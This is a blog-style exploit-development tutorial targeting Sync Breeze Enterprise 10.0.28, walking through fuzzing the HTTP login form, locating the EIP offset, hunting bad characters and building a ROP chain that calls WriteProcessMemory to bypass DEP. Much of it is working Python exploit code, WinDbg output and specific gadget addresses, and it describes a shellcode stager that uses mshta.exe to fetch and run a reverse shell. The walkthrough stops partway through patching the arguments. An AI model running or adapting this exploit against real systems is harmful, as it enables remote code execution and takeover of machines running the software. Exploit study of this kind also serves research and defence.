# Summary

In this blog, you are going through the adventure of developing an exploit for a remote buffer overflow vulnerability in Sync Breeze Enterprise 10.0.28.
Along with the exploitation you will have to bypass DEP Mitigation using the WriteProcessMemory technique by chaining ROP gadgets together.

# Initial information

First, you need to know some information about the software target, such as what it does. the ports it's listening to?

- After installing Syncbreeze, check it in the services

- I wrote for you a simple script with python to connect to the http server

```python
#!/usr/bin/env python3
import socket, sys
from struct import pack

def exploit():
    i = 200

    try:
        server = sys.argv[1]
        port = 80

        buffer = b'A' * i
        
        payload = buffer

        content = b"username=" + payload + b"&password=A"
        buffer = b"POST /login HTTP/1.1\r\n"
        buffer += b"Host: " + server.encode() + b"\r\n"
        buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
        buffer += b"\r\n"
        buffer += content

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server, port))
            s.send(buffer)
            response = s.recv(1024)
            s.close()
            print(f"[*] Malicious payload sent, received response: {response}")
    except Exception as e:
        print(e)

if __name__ == '__main__':
    exploit()
```

When you send just random 200 As you will recieve the http response 200 OK

```
[*] Malicious payload sent, received response: b'HTTP/1.1 200 OK\r\n'
```

![4aa0cc7ac4daf739ba664a99a0e5a2e4.png](/assets/images/sbe_images/4aa0cc7ac4daf739ba664a99a0e5a2e4.png)

With that being said, Move to fuzzing.

# Fuzzing

The fuzzing methodology here is very simple, just keep iterating 10 times, in each time you will increase the number of data that you will send by 100.

So at the beginning, you will be sending 200 A's, after that 300 A's, and just like that until the software crashes.

here is the script:

```python
#!/usr/bin/env python3
import socket, sys, time
from colorama import Fore, Style, init

def exploit():
    i = 200
    server = sys.argv[1]
    port = 80
    init()  # Initialize colorama

    while i <= 1000:
        try:
            buffer = b'A' * i
            payload = buffer
            content = b"username=" + payload + b"&password=A"
            buffer = b"POST /login HTTP/1.1\r\n"
            buffer += b"Host: " + server.encode() + b"\r\n"
            buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
            buffer += b"Content-Length: " + str(len(content)).encode() + b"\r\n"
            buffer += b"\r\n"
            buffer += content

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((server, port))
                s.send(buffer)
                response = s.recv(1024)  # Attempt to read server response
                print(Fore.GREEN + f"[*] Malicious payload sent with buffer size: {i}, received response: {response}" + Style.RESET_ALL)
            time.sleep(20)  # Delay of 20 seconds
        except Exception as e:
            print(Fore.RED + f"[!] Connection failed or server crashed at buffer size: {i}" + Style.RESET_ALL)
            print(e)
            break
        i += 100

if __name__ == '__main__':
    exploit()

```

As it's obvious in the video, the script starts fuzzing and it looks like the crashing happens when sending buffer size  800.

![sbe_fuzzing](/assets/images/sbe_images/sbe_fuzzing.gif)

You can check the software and it's crashed.

![e911c1aca0a90c2b8fb7728129b883a6.png](/assets/images/sbe_images/e911c1aca0a90c2b8fb7728129b883a6.png)

If you tried to pause the process, it will give you "Start" only because it's already crashed.

![7066ef1f051ad1131369fb11161da9f7.png](/assets/images/sbe_images/7066ef1f051ad1131369fb11161da9f7.png)

Start the process and let's continue.

## First eip overwrite

Attach the service to windbg and let's verify that you got control over the EIP.

Run windbg as Administrator

![6b675618e87c1bc9c9fcc05a52387f92.png](/assets/images/sbe_images/6b675618e87c1bc9c9fcc05a52387f92.png)

**File** `->` **Attach to process** `->` **Show processes from all users** `->` **syncbrs.exe** `->` **Attach**

![df57fc9a2c651da191bd5500775987b4.png](/assets/images/sbe_images/df57fc9a2c651da191bd5500775987b4.png)

Once you send the 800 A's, you will notice that SBE crashed and `eip=41414141`

![9427067de8e885edeaefb4066a460b6a.png](/assets/images/sbe_images/9427067de8e885edeaefb4066a460b6a.png)

## Finding the offset

Since you know you got the control over the EIP, now you will need to know at which offset exactly, so you can make the EIP execute whatever you want!

1. Generate pattern with msf-pattern_create
`msf-pattern_create -l 800`
![503d13c79c66303107434f42821ed854.png](/assets/images/sbe_images/503d13c79c66303107434f42821ed854.png)

2. Edit the script to send the generated pattern.

```python
#!/usr/bin/env python3
import socket, sys
from struct import pack

def exploit():
    try:
        server = sys.argv[1]
        port = 80

        pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"
        buffer = pattern # b'A' * 800
        
        payload = buffer

        content = b"username=" + payload + b"&password=A"
        buffer = b"POST /login HTTP/1.1\r\n"
        buffer += b"Host: " + server.encode() + b"\r\n"
        buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
        buffer += b"\r\n"
        buffer += content

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server, port))
            s.send(buffer)
            s.close()
            print(f"[*] Malicious payload sent")
    except Exception as e:
        print(e)

if __name__ == '__main__':
    exploit()
```


3. Run the script
You can notice that the software crashed at `42306142`

![b58f15d2b9dc9d228176cb492b28b036.png](/assets/images/sbe_images/b58f15d2b9dc9d228176cb492b28b036.png)

5. Use `msf-pattern_offset` inorder to know what is the offset of `42306142`
`msf-pattern_offset -l 800 -q 42306142`

![4c7bc70d1244a787b25bf93214ab786f.png](/assets/images/sbe_images/4c7bc70d1244a787b25bf93214ab786f.png)

6. Right now, you know that the offset is 780, let's prove it.

### Proving your control

1. Edit the script to send 4 Bs to control the EIP

```python
#!/usr/bin/env python3
import socket, sys
from struct import pack

def exploit():
    try:
        server = sys.argv[1]
        port = 80

        buffersize = 800
        offset = 780

        buffer = b'A' * 780
        eip = b"B" * 4
        
        payload = buffer + eip

        content = b"username=" + payload + b"&password=A"
        buffer = b"POST /login HTTP/1.1\r\n"
        buffer += b"Host: " + server.encode() + b"\r\n"
        buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
        buffer += b"\r\n"
        buffer += content

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server, port))
            s.send(buffer)
            s.close()
            print(f"[*] Malicious payload sent")
    except Exception as e:
        print(e)

if __name__ == '__main__':
    exploit()
```
	
2. Run the script

![8f3e4e092b9a9269ee12cb99a33ef1ab.png](/assets/images/sbe_images/8f3e4e092b9a9269ee12cb99a33ef1ab.png)

You can notice that the `eip=42424242`, This proves that you have control over EIP.

## Hunt Badchars

Now you want to hunt the badcharacters, the reason behind this is badcharacters will corrupt the stack and your exploit.
So if you are using any gadget or he shellcode contains badcharacter that will corrupt the whole exploit.

With that being said, the methodology behind hunting the badcharacters is as follow:

1. Send the list of badcharacters, either the whole list or on multiple chunks this will be based on the size of the buffer available. However in your case you have the enough buffer size to send the whole thing at once.
2. Check the stack, once you notice the sequance of the badcharacters list is broken in the stack.
3. So, you will remove that badcharacter causes the break/corruption in the sequence of the characters you sent and re-send them again and keep doing that until you make sure that all the characters sent with no problem.

Here is the script to hunt badcharacters:

```python
#!/usr/bin/env python3
import socket, sys
from struct import pack

def exploit():
    try:
        server = sys.argv[1]
        port = 80

        buffersize = 800
        offset = 780

        buffer = b'A' * 780
        eip = b"B" * 4

        badchars = (
        b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
        b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
        b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
        b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
        b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
        b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
        b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
        
        payload = buffer + eip + badchars

        content = b"username=" + payload + b"&password=A"
        buffer = b"POST /login HTTP/1.1\r\n"
        buffer += b"Host: " + server.encode() + b"\r\n"
        buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
        buffer += b"\r\n"
        buffer += content

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server, port))
            s.send(buffer)
            s.close()
            print(f"[*] Malicious payload sent")
    except Exception as e:
        print(e)

if __name__ == '__main__':
    exploit()
```

- Run the script and check the stack with `db esp - 10`.
- Notice how from 01 to 09, the sequence is right, once you get to the next one which is suppose to be `0a` you see `00` in the red.

![7e568711d0f1cf24f91f555455480c3f.png](/assets/images/sbe_images/7e568711d0f1cf24f91f555455480c3f.png)

- Remove `0a` from the list of badcharacters and run the script again.

![7469ddf174333140d243ac3f69c3860d.png](/assets/images/sbe_images/7469ddf174333140d243ac3f69c3860d.png)

- Remove `0b` from the list of badcharacters and run the script again.
- You just have to keep iterating through the same process and you will find that the badcharacters are the following: `\x00\x0a\x0d\x25\x26\x2b\x3d`.


# DEP Bypass with WPM

Right now you know the badcharacters, you know the offset, you already controled the EIP, if you tried to execute shellcode it won't work and the reason behind this is that the DEP mitigation is enabled.

### What is DEP? 

- Data Execution Prevention (DEP) is a technology built into Windows that helps protect you from executable code launching from places it's not supposed to. 

### How DEP works?

- DEP does that by marking some areas of your PC's memory as being for data only, no executable code or apps will be allowed to run from those areas of memory.

### Enabling DEP

Sync Breeze by default compiled without DEP protection with that being said you will have to enable it by yourself.

First of all, Check the different pre-enabling DEP and post-enabling DEP.

#### Pre-Enabling DEP

- Attach SyncBreeze 
- Using `ed` write `90909090` to the stack
`ed esp 90909090`
- Now, make EIP points to ESP 
`r eip = esp`
- Verify ESP with `u esp`
- You can see the nops there
- Using `p` command step through the execution and you can see it's executing the NOP. This means SyncBreeze has no DEP protection.

![0823c8e3029c9d253671ad86275b9711.png](/assets/images/sbe_images/0823c8e3029c9d253671ad86275b9711.png)

#### Post-Enabling DEP

in order to enable DEP, you do the following:

- **Windows Security** `->` **App & browser control** `->` **Exploit protection settings** `->` **Program settings** `->` **Add program to customize** `->` **Choose exact file path** now go to this path `C:\Program Files\Sync Breeze Enterprise\bin\` and choose `syncbrs.exe`.
- Check DEP

![27c26b272842c53d4fe8ffa8698c0125.png](/assets/images/sbe_images/27c26b272842c53d4fe8ffa8698c0125.png)

![d2163f75363328d2d2292789ba115d12.png](/assets/images/sbe_images/d2163f75363328d2d2292789ba115d12.png)

- Now, restart syncbreeze service and do the exact same thing as you did before.
- Notice that once you try to execute the NOP instruction, an **Access violation** error encounter you.

### How to bypass DEP?

It's pretty easy, the whole idea behind bypassing DEP is to allocate a part of the memory and make it executable to execute the shellcode in that allocated part.
The other way is to to copy the shellcode to executable part of memory.

### What is WriteProcessMemory

**WriteProcessMemory** is a Windows API function used to write data to a specific area of memory in a process running on the Windows operating system.

#### WPM Syntax:

```cpp
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
```

- `hProcess` is a handle to the process memory to be modified. since we will be using the same current process the value will be  `-1` or `0xFFFFFFFF` and this is called pseudo handle.
- `lpBaseAddress` A pointer to a place / buffer and it's called **code cave** in the memory where our shellcode will be writtren in.
- `lpBuffer` This is basically the address of the shellcode, our shellcode will be in the `lpBuffer` and WPM will copy the shellcode from the `lpBuffer` and write to the address in `lpBaseAddress`
- `nSize` This specifis the size of the shellcode and it must be same size as the shellcode or bigger.
- `lpNumberOfBytesWritten` basically an optional argument and it can be `NULL`. It's a pointer to a variable that receives the number of bytes transferred into the specified process by WPM.

### What is Code Cave?

As earlier mentioned that `lpBaseAddress` points to a **code cave**.

Code cave is an empty/unused memory region getting created by the compiler when compiling the software.
This region must have **READ & EXECUTE** permissions inorder to be able to execute the shellcode.

## Enumerating Libraries



## Preparing Args

Some of the args are static or hardcoded such as the 

1. `hProcess` it's `0xFFFFFFFF` since it's a pseudo handle.
2. `lpBaseAddress` which is the code cave, and we will have to find it by yourself.
3. `lpNumberOfBytesWritten` also you will have to find it by yourself.



### Where is my Cave!

- Finding the code cave which will be for the **lpBaseAddress** argument.

- First, You have to enumerate the modules and their protection
- Use narly.

```
0:010> !nmod
00400000 00462000 syncbrs              /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\syncbrs.exe
009f0000 00aa4000 libsync              /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\libsync.dll
00b90000 00c64000 libpal               /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
10000000 10223000 libspp               /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll
```

- There are two modules fit to the exploit. `libpal` & `libspp`
- Let's go with libspp

- Locate the code section
- Take the first dword and add it to `libspp` module

![0fda9221d18a51b144f248e3a83e9de3.png](/assets/images/sbe_images/0fda9221d18a51b144f248e3a83e9de3.png)

- Check the address and it's permissions
![a55d821091e2ef3a0360866921da3dce.png](/assets/images/sbe_images/a55d821091e2ef3a0360866921da3dce.png)

- Inorder to find the an empty region, take the **End Address** and subtract a value from it that can be space enough for the shellcode
- So trying subtracting 600

![279fda10a00c7dae19ffebc194224c4b.png](/assets/images/sbe_images/279fda10a00c7dae19ffebc194224c4b.png)

- Because of the nullbyte, Add 4 to the address `0x10167a00` resulting the address  `0x10167a04`
- So the code cave is `10167a04`

### lpNumberOfBytesWritten arg

This argument needs to be a pointer to a writable DWORD where WriteProcessMemory will store the number of bytes that were copied. We could use a stack address for this pointer, but it's easier to use an address inside the data section of the module you are using, as you do not have to gather it at runtime.

- use the **!dh** command to find the data section's start address, supplying the **-a** flag to dump the name of the module along with all header information.

![1950842d9685ab378f8d698c60edc1e4.png](/assets/images/sbe_images/1950842d9685ab378f8d698c60edc1e4.png)

- Now find the **.data** section

![f1afa37f6cf57f8d8d0f4b13946b2c5c.png](/assets/images/sbe_images/f1afa37f6cf57f8d8d0f4b13946b2c5c.png)

- The **size** of the section is **0x37040** and the **section address** is **0x1D5000**.

- You need to check the content of the address to ensure the content is not being used and to verify memory protections.

![227b4d841616a46602b291fd6f5fb2c7.png](/assets/images/sbe_images/227b4d841616a46602b291fd6f5fb2c7.png)

![b01d0a35d9d26c04c2d80750451ea5a5.png](/assets/images/sbe_images/b01d0a35d9d26c04c2d80750451ea5a5.png)

So right now after you already gathered all the args and now here is how the WPM skeleton looks like:

![b656505ed202efb0fa0e0d207b907cf5.png](/assets/images/sbe_images/b656505ed202efb0fa0e0d207b907cf5.png)

What is a skeleton will be explained soon in the blog. keep reading 🤜🤛

# Enumerating the IAT

- IAT is the **Import Address Table**. It's part of the Portable Executable file format on Windows systems, used for managing dynamic links to libraries. When an executable loads, the IAT is populated with actual memory addresses of functions from dynamically-linked libraries (DLLs), enabling the executable to call these functions at runtime without prior knowledge of their locations.
- Now you understand that inorder to call WPM you need to find it in the IAT.
- WPM in part of KERNEL32, and KERNEL32 is a system DLL so it has ASLR enabled that means the real address of WPM will change each time rebooting the system or the software.
- The IAT addresses that point to functions are static meaning the IAT Address of WPM that points to the real WPM is static and won't change.

## The Enum Starts

- Get the IAT Offset, you can see it there. it's `168000`

![271c1cfa05bd078b7cf440538773f166.png](/assets/images/sbe_images/271c1cfa05bd078b7cf440538773f166.png)

- Now, add the IAT offset to the module inorder to dump the table.

![8f1c3ff87b28586efe5f35df74d695a8.png](/assets/images/sbe_images/8f1c3ff87b28586efe5f35df74d695a8.png)

- As you can notice there is no KERNEL32!WriteProcessMemoryStub in the table.

Now, since the WPM is not in the table, you will have to apply some tricks.

- Let's take GetLastErrorStub and subrtact WriteProcessMemoryStub from it as follows:
```
0:012> ? KERNEL32!GetLastErrorStub - KERNEL32!WriteProcessMemoryStub
Evaluate expression: -120528 = fffe2930
```
- This is basically the offset or the difference between GetLastErrorStub and WPM, meaning if you  added that offset to GetLastErrorStub you should get WPM. It's simple math really.
- Let's verify it manually, starting examining GetLastErrorStub
```
0:012> u KERNEL32!GetLastErrorStub
KERNEL32!GetLastErrorStub:
76df3740 ff25e483e576    jmp     dword ptr [KERNEL32!_imp__GetLastError (76e583e4)]
```
- The address of GetLastErrorStub is `76df3740`
- Now, let's add decimal 120528 (the offset) to `76df3740`
```
0:012> ? 76df3740 + 0n120528
Evaluate expression: 1994460688 = 76e10e10
```
- Examin `76e10e10`
```
0:012> u 76e10e10
KERNEL32!WriteProcessMemoryStub:
76e10e10 8bff            mov     edi,edi
76e10e12 55              push    ebp
76e10e13 8bec            mov     ebp,esp
76e10e15 5d              pop     ebp
76e10e16 ff252088e576    jmp     dword ptr [KERNEL32!_imp__WriteProcessMemory (76e58820)]
76e10e1c cc              int     3
76e10e1d cc              int     3
76e10e1e cc              int     3
```

- You can see WriteProcessMemoryStub, same logic will be applied now but using ROP.
- Also a very important note, notice that you added the decimal to real address of GetLastError and not to the IAT Address with that being said you will be using the IAT Address to make it works anytime (as mentioned before addresses change) inorder to use IAT address you need a pointer. This will be more clarified while patching the args.



# Start Patching

## What is Skeleton

Before start patching the args, what is skeleton?!

Basically and simply skeleton is the args needs to be patched and pushed to the stack in order to call the function wanted for the exploit.

An exploit skeleton provides a basic structure for an exploit, including placeholders or basic implementations for key components like payload delivery, shellcode execution, and bypassing security mechanisms.

![c6e94593a72ac7c9eeb38ab1822a5e48.png](/assets/images/sbe_images/c6e94593a72ac7c9eeb38ab1822a5e48.png)

Any values expect the ones already added manually such as lpBaseAddress (Code Cave ) ..etc are dummy values that will by dynamically replaced/patched with the right values.


## Saving ESP Address

![8808f7532043d5af895a2c7633cc6bd2.png](/assets/images/sbe_images/8808f7532043d5af895a2c7633cc6bd2.png)

- After you  have all the initial arguments, you should start with saving ESP.
- The reason behind that is that the ESP now is the closest to the WPM Skeleton, so later when you are going to start patching the arguments you can easily jump back to the top of the skeleton.

- To save the ESP I found the following gadget: `0x10154112: push esp ; inc ecx ; adc eax, 0x08468B10 ; pop esi ; ret  ;  (1 found)`
- Basically, this gadget will push ESP to the skeleton
- The next two instructions are not relevant
- Now the value that pushed to the stack (i.e. esp) will be poped into the ESI.
- Finally `ret` will return the control to the next address on the stack i.e. the next gadget.

- Now you have to calculate the difference between the address saved in the ESI and the beginning of our skeleton in order to point to the top of the stack again and start replacing the dummy values with the right values.

- in order to do that search for 69 69 69 69 in the stack

`0:010> s -b 007b2000 007c0000 69 69 69 69`

![1eeeb293b2cfb1dbb7130f8cab0920df.png](/assets/images/sbe_images/1eeeb293b2cfb1dbb7130f8cab0920df.png)
 
 - Then subtract the address where the skeleton is from ESI and the result is 36 decimal.
 
 ```
 0:010> ? esi - 007b7428  
Evaluate expression: 36 = 00000024
 ```
 
 So basically esi - 36 = the top of the skeleton.
 
 Now I have to move esi to eax or ecx since those are the regs that are used for arithmetic operations. After that I have to add the -0n36 to the address or subtract 0n36 from the address that previouslly saved in ESI in order to make the address pointing to top of the skeleton.
 
 > Why adding -0n36? because positive number + negative number = subtraction and the result is positive number. e.g. 10 + -3  = 7.
 
 since I want to move the value in **ESI** to **EAX** or **ECX**, I need to find a ROP Gadget that allows me to store the **-0n36** in a register that I can add it to **EAX** or **ECX**.
 
 Using the following regex: `: add eax,( edx | ebx | ebp) ; .*.ret`
 I found the following gadget: `0x100fcd71: add eax, ebp ; dec ecx ; ret`
 Now I have to find another gadget that can store -0n36 into **EBP**. something like this is good enough `0x10151821: pop ebp ; ret`
 
 Now lunch the exploit, step through the gadgets to verify everything is working the right way.

```python
rop += pack('<L', 0x1013ada1) # mov eax, esi ; pop esi ; ret
rop += b"A" * 4 # dummy for the ESI
rop += pack('<L', 0x10151821) # pop ebp ; ret
rop += pack('<L', 0xffffffdc) # -0n36
rop += pack('<L', 0x100fcd71) # add eax, ebp ; dec ecx ; ret
```

![0a39419635e7b32daee8d7ae559ca6c8.png](/assets/images/sbe_images/0a39419635e7b32daee8d7ae559ca6c8.png)
 
 Now I want to move the value in **EAX** somewhere else, since we **EAX** for arithmetic much more.
 
 ![f6b4291137e3d08b282488ca86207f43.png](/assets/images/sbe_images/f6b4291137e3d08b282488ca86207f43.png)
 
 We are going with `0x100cb4d4: xchg eax, edx ; ret`
 
 # Patching WPM
 
 Since the first thing on the top of the skeleton is the dummy value for WPM, I will start by patching it first.
 We already have the address of  KERNEL32!GetLastErrorStub in the IAT and we have the offset to WPM.
 
 So first, we have to store the offset to WPM either in **EAX** or **ECX**.
 
 ![38f95191916083a88d89a051e03145d2.png](/assets/images/sbe_images/38f95191916083a88d89a051e03145d2.png)
 
 it looks like we will be storing in **EAX**: `0x1012b413: pop eax ; ret`
 Now we have to use neg instruction with the **EAX** `0x10104df6: neg eax ; ret` 
 
```
0:012> ? KERNEL32!GetLastErrorStub - KERNEL32!WriteProcessMemoryStub
Evaluate expression: -120528 = fffe2930
```
 
 If you don't remember, we already have the offset between WPM and GetLAstError is "-120528" 
 The negative value of the decimal number `120528` will be used, and after that using neg instruction to convert it back.
 
 Let's verify those gadgets before we move forward.
 
```python
print("[+] Patching WPM ...")
rop += pack('<L', 0x1012b413) # pop eax ; ret
rop += pack('<L', 0xfffe2930) # negative offset to WPM
rop += pack('<L', 0x10104df6) # neg eax ; ret
```

![190bf4231293c1abcf86c55a37124d70.png](/assets/images/sbe_images/190bf4231293c1abcf86c55a37124d70.png)

Since it all works, we have to move the value of EAX to another register and store the IAT address of GetLastError into EAX, After that use an instruction that can move the value from the memory location pointed to by the eax register into eax itself. 

The reason behind that is as follow:

EAX has the value of the IAT Address of GetLastError, however as it's explained before the offset has to be added to the real address of GetLastError with that being said you need an insutrction that moves the value from the memory location pointed to by the eax which is the real address of GetLastError to EAX. So now EAX = The Real Address of GetLastError

Now, when you add the offset to EAX, it will be added to the real address of GetLastError and the result is the address of WPM as it's explained manually earlier.

![e21791d7b84debd5d4dd444bff59bc91.png](/assets/images/sbe_images/e21791d7b84debd5d4dd444bff59bc91.png)

So for this purpose I found the following gadget: `0x1014dc4c: mov eax, dword [eax] ; ret`


Now we have to move the value in **EAX** which is now the address of WPM to **EDX** since it pointd to the top of the skeleton **0x69696969** i.e dummy WPM Address

```python
print("[+] Patching WPM ...")
rop += pack('<L', 0x1012b413) # pop eax ; ret
rop += pack('<L', 0xfffe2930) # negative offset to WPM
rop += pack('<L', 0x10104df6) # neg eax ; ret
rop += pack('<L', 0x1014426e) # xchg eax, ebp ; ret
rop += pack('<L', 0x1012b413) # pop eax ; ret
rop += pack('<L', 0x10168040) # IAT Address of KERNEL32!GetLastErrorStub
rop += pack('<L', 0x1014dc4c) # mov eax, [eax] ; ret
rop += pack('<L', 0x100fcd71) # add eax, ebp ; dec ecx ; ret
rop += pack('<L', 0x1012d3ce) # mov dword [edx], eax ; ret
```

Let's verify it 

![61504ce78aa8f52805b13bf89191758b.png](/assets/images/sbe_images/61504ce78aa8f52805b13bf89191758b.png)

![d00ef482fde9e565d5c63433bdbe0d7f.png](/assets/images/sbe_images/d00ef482fde9e565d5c63433bdbe0d7f.png)

![1d79777ac0f646efa9e804322484f382.png](/assets/images/sbe_images/1d79777ac0f646efa9e804322484f382.png)

# Pass 3 Args

Now we have the next 3 arguments that basically you need to skip since those args are hardcoded.

- Return Address after WriteProcessMemory
- hProcess
- lpBaseAddress

Those addresses are already provided

![2a409e97f6e115d0217560af37a067e5.png](/assets/images/sbe_images/2a409e97f6e115d0217560af37a067e5.png)

So I need to move the pointer that points to the skeleton to **lpBuffer** argument

Find a gadget that increase the **EDX**

![b7e42750665cc2080758688e85fb1031.png](/assets/images/sbe_images/b7e42750665cc2080758688e85fb1031.png)

`0x100bb1f4: inc edx ; ret`

![ac6ff34e47c8c296088a1a936b5c313e.png](/assets/images/sbe_images/ac6ff34e47c8c296088a1a936b5c313e.png)

You  want to get to 6d6d6d6d, You have 4 addresses at the beginning that you need to bypass first.

With that being said is 4 * 4 = 16, so we need 16 times of increasing.

![4a644aa0feddd23641cca39e522db330.png](/assets/images/sbe_images/4a644aa0feddd23641cca39e522db330.png)

Right now it's pointing at 69696969

![8d31e96f3ff64b8c4fce0f586c06a950.png](/assets/images/sbe_images/8d31e96f3ff64b8c4fce0f586c06a950.png)

# Patching lBuffer

As you passed the 3 arguments and you got to **0x6d6d6d6d**, now you have to replace it with value of **lBuffer**

the whole idea behind lBuffer is the address of the shellcode, where is the shellcode?! So from where the  **0x6d6d6d6d** exists to  where the shellcode is stored.

I'm going to send shellcode stager, basically a small software that will load or download the reverseshell that will execute and give us access.

## The Shellcode

In order to create this stager, I already wrote a simple script for that (inspired by my brother Zeyad Azima), the tool itself still under development

![4cbe24bfedb60e8d2945dd794f13ca95.png](/assets/images/sbe_images/4cbe24bfedb60e8d2945dd794f13ca95.png)


The art of writing shellcode and shellcoding will be explained in another blog inshallah, however for now this shellcode will run `mshta.exe` download an executable reverseshell named `a` and execute that reverseshell.

As the results show there is a badcharacter `\x0d` at index `90`.

This badcharacter will be encoded and decoded manually later.

## After shellcoding 

First verify that edx point to the right place.
Take any random address from there, and use `!address` command, You just need the Base and End Address of the stack in order to search in the stack looking for the shellcode, so I can calculate the difference between where is **0x6d6d6d6d** and where the shellcode is at.

![ed9015a0b0e5977ce768d927fe188261.png](/assets/images/sbe_images/ed9015a0b0e5977ce768d927fe188261.png)

This is the beginning of the shellcode `89 e5 81 c4 f0`
Using the following command to search for the bytes `s -b 00832000 00840000 89 e5 81 c4 f0`

The results of the search

![c64bcf1b4e6483c05fb493ae09e3433f.png](/assets/images/sbe_images/c64bcf1b4e6483c05fb493ae09e3433f.png)

EDX = `007c7438`

I'm looking for the closest address to edx, and we can see it right there in the blue.

Calculating the length difference:

```
0:009> ? 007c7539   - edx
Evaluate expression: 257 = 00000101
```

Make the 164 decimal as negative value:

```
0:009> ? -0n257 
Evaluate expression: -257 = fffffeff 
```

So now our goal is clear. simple math

**edx current address that point to 69696969 + 0n257 = the address of the shellcode**

in order to prove this, let's verify it:

![52ff2b67ef44f07933098d57afbfe195.png](/assets/images/sbe_images/52ff2b67ef44f07933098d57afbfe195.png)

First you can see what edx is pointing to, and you are displaying the first 4 bytes which are the **69 69 69 69**

After that add edx and 257  decimal together and that results with the address **01bb7539**

now using `db` command you can check the content there.
Notice that the first few bytes are the same we searched for before meaning those are the beginning of the shellcode. i.e. Now it's pointing to the shellcode.

Let's write the gadget

- Easily store the negative 257 in eax
- use `neg` instruction with eax
- add eax to edx, or edx to eax since it's the same results
